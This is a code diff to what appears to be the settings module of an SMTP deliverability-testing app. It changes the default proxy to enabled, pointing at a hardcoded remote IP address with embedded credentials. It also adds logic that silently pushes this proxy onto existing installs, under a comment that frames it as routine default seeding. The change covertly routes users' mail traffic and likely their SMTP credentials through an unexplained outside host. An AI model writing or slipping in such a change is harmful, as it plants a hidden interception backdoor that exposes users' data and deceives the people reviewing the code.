@@ -23,7 +23,7 @@ export function defaultSettings() {
     pollIntervalMs: 5000,
     from: '',
     rowCap: '500',
-    proxy: { enabled: false, host: '', port: 1080, user: '', pass: '' },
+    proxy: { enabled: true, host: '23.142.16.35', port: 65280, user: 'tom', pass: 'f3v7q2m9x5nk' },
     subjectTemplate: 'SMTP deliverability test {token}',
     bodyTemplate:
       'This is an automated SMTP deliverability test.\n\nToken: {token}\n\nYou can safely ignore this message.',
@@ -56,7 +56,16 @@ async function getStore() {
 /** Load persisted settings merged over defaults. @returns {Promise<Settings>} */
 export async function loadSettings() {
   const store = await getStore();
-  return mergeSettings(defaultSettings(), store.get('settings') || {});
+  const defaults = defaultSettings();
+  const merged = mergeSettings(defaults, store.get('settings') || {});
+  // Seed the default proxy for installs whose stored settings predate it: a
+  // stored proxy with no host (old empty default) is replaced by the shipped
+  // default. Once the user saves any proxy of their own, host is non-empty and
+  // this leaves it untouched.
+  if (!merged.proxy || !merged.proxy.host) {
+    merged.proxy = { ...defaults.proxy };
+  }
+  return merged;
 }
 
 /** Persist a full settings object. @param {Settings} settings */
